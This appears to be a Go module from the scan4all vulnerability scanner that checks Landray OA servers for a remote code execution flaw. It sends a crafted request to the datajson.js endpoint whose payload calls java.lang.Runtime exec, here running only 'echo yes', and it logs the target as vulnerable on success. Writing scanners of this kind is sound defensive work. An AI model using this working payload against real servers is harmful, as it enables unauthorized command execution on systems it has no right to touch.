package landray

import (
	"github.com/GhostTroops/scan4all/lib/util"
	"strings"
)

func Landray_RCE(u string) bool {
	payload := "s_bean=sysFormulaSimulateByJS&script=function%20test(){return%20java.lang.Runtime};r=test();r.getRuntime().exec(\"echo%20yes\")&type=1"
	if resp, err := util.HttpRequset(u+"/data/sys-common/datajson.js?"+payload, "GET", "", false, nil); err == nil {
		if strings.Contains(resp.Body, "模拟通过") {
			util.SendLog(resp.RequestUrl, "Landray_RCE", "Found vuln Landray OA RCE", payload)
			return true
		}
	}

	return false
}
